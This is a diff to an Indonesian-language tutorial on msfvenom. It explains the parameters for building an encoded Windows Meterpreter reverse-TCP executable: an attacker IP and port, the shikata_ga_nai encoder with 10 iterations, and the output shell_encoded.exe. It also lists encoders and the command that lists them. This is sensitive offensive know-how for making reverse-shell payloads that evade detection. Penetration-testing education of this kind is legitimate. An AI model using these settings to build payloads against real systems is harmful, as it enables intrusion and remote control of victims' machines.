@@ -29,10 +29,10 @@ Keterangan:
 - `-p`: Jenis payload: `windows/meterpreter/reverse_tcp`
 - `LHOST`: IP Attacker: `192.168.1.100`
 - `LPORT`: Port listener: `4444`
-- `-e`: Encoder (contoh: `x86/shikata_ga_nai`)
-- `-i`: Iterasi encoder (semakin banyak, semakin acak tapi bisa tidak stabil)
+- `-e`: Encoder: `x86/shikata_ga_nai`
+- `-i`: Iterasi encoder: `10`
 - `-f`: Format payload: `exe`
-- `-o`: Nama file hasil payload: `shell_encoded.exe` 
+- `-o`: Nama file hasil payload: `shell_encoded.exe`
 
 Encoder Populer di Metasploit:
 - `x86/shikata_ga_nai`
@@ -40,7 +40,7 @@ Encoder Populer di Metasploit:
 - `x86/countdown`
 - `x86/jmp_call_additive`
 
-Cek Semua Encoder:
+Untuk melihat semua encoder yang ada di MSFvenom ketikkan:
 
 ```
 msfvenom --list encoders
